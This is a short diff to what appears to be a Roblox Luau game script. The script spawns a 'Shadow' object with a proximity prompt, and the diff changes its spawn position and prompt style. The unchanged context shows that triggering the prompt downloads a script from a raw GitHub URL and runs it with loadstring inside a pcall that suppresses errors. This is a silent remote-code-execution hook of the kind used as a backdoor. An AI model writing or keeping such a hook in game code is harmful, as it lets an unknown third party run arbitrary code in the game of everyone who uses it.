@@ -48,7 +48,9 @@ local function spawnShadow()
 		shadow.PrimaryPart = handle
 	end
 
-	shadow:SetPrimaryPartCFrame(CFrame.new(keyhitbox.Position))
+	local spawnPos = keyhitbox.CFrame * CFrame.new(0, 2, 0)
+	shadow:SetPrimaryPartCFrame(spawnPos)
+
 
 	for _, p in ipairs(shadow:GetDescendants()) do
 		if p:IsA("BasePart") then
@@ -66,6 +68,7 @@ local function spawnShadow()
 	prompt.ObjectText = "Shadow"
 	prompt.MaxActivationDistance = 5
 	prompt.HoldDuration = 3
+	prompt.Style = Enum.ProximityPromptStyle.Custom
 	prompt.RequiresLineOfSight = false
 	prompt.Parent = handle
 
@@ -86,7 +89,7 @@ local function spawnShadow()
 			pcall(function()
 				loadstring(game:HttpGet(
 					"https://raw.githubusercontent.com/eoyoustme/back/refs/heads/main/cruc"
-				))()
+					))()
 			end)
 
 			return
